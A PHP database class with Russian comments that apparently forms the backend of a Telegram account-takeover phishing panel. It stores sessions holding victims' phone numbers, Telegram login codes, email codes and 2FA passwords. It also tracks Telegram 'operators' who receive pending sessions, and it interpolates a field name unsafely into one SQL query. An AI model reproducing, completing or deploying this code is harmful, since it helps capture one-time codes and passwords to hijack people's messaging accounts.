<?php
// database.php - ИСПРАВЛЕННЫЙ
require_once 'config.php';

class Database {
    private $pdo;
    private $useFileStorage = false;
    private $sessionFile;
    
    public function __construct() {
        $this->sessionFile = __DIR__ . '/sessions.json';
        
        try {
            $this->pdo = new PDO(
                "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8mb4",
                DB_USER,
                DB_PASS,
                [
                    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                    PDO::ATTR_EMULATE_PREPARES => false
                ]
            );
            
            $this->checkTables();
            
        } catch (PDOException $e) {
            $this->useFileStorage = true;
            $this->initFileStorage();
        }
    }
    
    private function checkTables() {
        $tables = ['sessions', 'operators'];
        
        foreach ($tables as $table) {
            $check = $this->pdo->query("SHOW TABLES LIKE '{$table}'")->fetch();
            if (!$check) {
                $this->createTables();
                break;
            }
        }
    }
    
    private function createTables() {
        $sql = [
            "CREATE TABLE IF NOT EXISTS sessions (
                id VARCHAR(50) PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                country_code VARCHAR(10),
                status VARCHAR(20) DEFAULT 'pending',
                code_sent BOOLEAN DEFAULT FALSE,
                email_required BOOLEAN DEFAULT FALSE,
                requires_2fa BOOLEAN DEFAULT FALSE,
                telegram_code VARCHAR(10),
                email_code VARCHAR(10),
                password VARCHAR(255),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            )",
            
            "CREATE TABLE IF NOT EXISTS operators (
                chat_id VARCHAR(50) PRIMARY KEY,
                username VARCHAR(100),
                first_name VARCHAR(100),
                last_name VARCHAR(100),
                is_active BOOLEAN DEFAULT TRUE,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )"
        ];
        
        foreach ($sql as $query) {
            try {
                $this->pdo->exec($query);
            } catch (PDOException $e) {
                // Игнорируем ошибки создания таблиц
            }
        }
    }
    
    private function initFileStorage() {
        if (!file_exists($this->sessionFile)) {
            file_put_contents($this->sessionFile, json_encode([]));
        }
    }
    
    private function saveToFile($data) {
        file_put_contents($this->sessionFile, json_encode($data, JSON_PRETTY_PRINT));
    }
    
    private function loadFromFile() {
        if (file_exists($this->sessionFile)) {
            $content = file_get_contents($this->sessionFile);
            return json_decode($content, true) ?: [];
        }
        return [];
    }
    
    public function createSession($data) {
        if ($this->useFileStorage) {
            $sessions = $this->loadFromFile();
            $sessions[$data['session_id']] = [
                'id' => $data['session_id'],
                'phone' => $data['phone'],
                'country_code' => $data['country_code'] ?? '7',
                'status' => 'pending',
                'telegram_code' => '',
                'email_code' => '',
                'requires_2fa' => false,
                'email_required' => false,
                'code_sent' => false,
                'created_at' => date('Y-m-d H:i:s'),
                'updated_at' => date('Y-m-d H:i:s')
            ];
            $this->saveToFile($sessions);
            return true;
        }
        
        $sql = "INSERT INTO sessions (id, phone, country_code, status) VALUES (?, ?, ?, 'pending')";
        $stmt = $this->pdo->prepare($sql);
        return $stmt->execute([$data['session_id'], $data['phone'], $data['country_code']]);
    }
    
    public function getSession($sessionId) {
        if ($this->useFileStorage) {
            $sessions = $this->loadFromFile();
            return $sessions[$sessionId] ?? null;
        }
        
        $sql = "SELECT * FROM sessions WHERE id = ?";
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([$sessionId]);
        return $stmt->fetch();
    }
    
    public function updateSessionStatus($sessionId, $status) {
        if ($this->useFileStorage) {
            $sessions = $this->loadFromFile();
            if (isset($sessions[$sessionId])) {
                $sessions[$sessionId]['status'] = $status;
                $sessions[$sessionId]['updated_at'] = date('Y-m-d H:i:s');
                $this->saveToFile($sessions);
            }
            return true;
        }
        
        $sql = "UPDATE sessions SET status = ?, updated_at = NOW() WHERE id = ?";
        $stmt = $this->pdo->prepare($sql);
        return $stmt->execute([$status, $sessionId]);
    }
    
    public function updateSessionCode($sessionId, $code, $field = 'telegram_code') {
        if ($this->useFileStorage) {
            $sessions = $this->loadFromFile();
            if (isset($sessions[$sessionId])) {
                $sessions[$sessionId][$field] = $code;
                $sessions[$sessionId]['code_sent'] = true;
                $sessions[$sessionId]['status'] = 'code_sent';
                $sessions[$sessionId]['updated_at'] = date('Y-m-d H:i:s');
                $this->saveToFile($sessions);
            }
            return true;
        }
        
        $sql = "UPDATE sessions SET $field = ?, code_sent = TRUE, status = 'code_sent' WHERE id = ?";
        $stmt = $this->pdo->prepare($sql);
        return $stmt->execute([$code, $sessionId]);
    }
    
    public function setRequires2FA($sessionId, $requires = true) {
        if ($this->useFileStorage) {
            $sessions = $this->loadFromFile();
            if (isset($sessions[$sessionId])) {
                $sessions[$sessionId]['requires_2fa'] = $requires;
                $sessions[$sessionId]['updated_at'] = date('Y-m-d H:i:s');
                $this->saveToFile($sessions);
            }
            return true;
        }
        
        $sql = "UPDATE sessions SET requires_2fa = ? WHERE id = ?";
        $stmt = $this->pdo->prepare($sql);
        return $stmt->execute([$requires, $sessionId]);
    }
    
    public function setEmailRequired($sessionId, $required = true) {
        if ($this->useFileStorage) {
            $sessions = $this->loadFromFile();
            if (isset($sessions[$sessionId])) {
                $sessions[$sessionId]['email_required'] = $required;
                $sessions[$sessionId]['status'] = 'email_required';
                $sessions[$sessionId]['updated_at'] = date('Y-m-d H:i:s');
                $this->saveToFile($sessions);
            }
            return true;
        }
        
        $sql = "UPDATE sessions SET email_required = ?, status = 'email_required' WHERE id = ?";
        $stmt = $this->pdo->prepare($sql);
        return $stmt->execute([$required, $sessionId]);
    }
    
    public function getPendingSessions() {
        if ($this->useFileStorage) {
            $sessions = $this->loadFromFile();
            $pending = [];
            foreach ($sessions as $id => $session) {
                if ($session['status'] === 'pending') {
                    $pending[] = array_merge(['id' => $id], $session);
                }
            }
            return $pending;
        }
        
        $sql = "SELECT * FROM sessions WHERE status = 'pending' ORDER BY created_at DESC";
        $stmt = $this->pdo->query($sql);
        return $stmt->fetchAll();
    }
    
    public function verifyCode($sessionId, $code) {
        $session = $this->getSession($sessionId);
        if ($session && isset($session['telegram_code']) && $session['telegram_code'] == $code) {
            $this->updateSessionStatus($sessionId, 'approved');
            return true;
        }
        return false;
    }
    
    public function verifyEmailCode($sessionId, $code) {
        $session = $this->getSession($sessionId);
        if ($session && isset($session['email_code']) && $session['email_code'] == $code) {
            $this->updateSessionStatus($sessionId, 'approved');
            return true;
        }
        return false;
    }
    
    public function verifyPassword($sessionId, $password) {
        if ($this->useFileStorage) {
            $sessions = $this->loadFromFile();
            if (isset($sessions[$sessionId])) {
                $sessions[$sessionId]['password'] = password_hash($password, PASSWORD_DEFAULT);
                $sessions[$sessionId]['status'] = 'completed';
                $sessions[$sessionId]['updated_at'] = date('Y-m-d H:i:s');
                $this->saveToFile($sessions);
            }
            return true;
        }
        
        $sql = "UPDATE sessions SET password = ?, status = 'completed' WHERE id = ?";
        $stmt = $this->pdo->prepare($sql);
        return $stmt->execute([password_hash($password, PASSWORD_DEFAULT), $sessionId]);
    }
    
    public function getActiveOperators() {
        if ($this->useFileStorage) {
            return ADMIN_CHAT_IDS;
        }
        
        $sql = "SELECT chat_id FROM operators WHERE is_active = TRUE";
        $stmt = $this->pdo->query($sql);
        $result = $stmt->fetchAll(PDO::FETCH_COLUMN);
        return empty($result) ? ADMIN_CHAT_IDS : $result;
    }
    
    public function addOperator($chatId, $username, $firstName, $lastName) {
        if ($this->useFileStorage) {
            return true;
        }
        
        $sql = "INSERT INTO operators (chat_id, username, first_name, last_name) 
                VALUES (?, ?, ?, ?) 
                ON DUPLICATE KEY UPDATE 
                username = VALUES(username),
                first_name = VALUES(first_name),
                last_name = VALUES(last_name),
                last_seen = NOW()";
        $stmt = $this->pdo->prepare($sql);
        return $stmt->execute([$chatId, $username, $firstName, $lastName]);
    }
    
    public function setOperatorActive($chatId, $active = true) {
        if ($this->useFileStorage) {
            return true;
        }
        
        $sql = "UPDATE operators SET is_active = ?, last_seen = NOW() WHERE chat_id = ?";
        $stmt = $this->pdo->prepare($sql);
        return $stmt->execute([$active, $chatId]);
    }
}

$db = new Database();
?>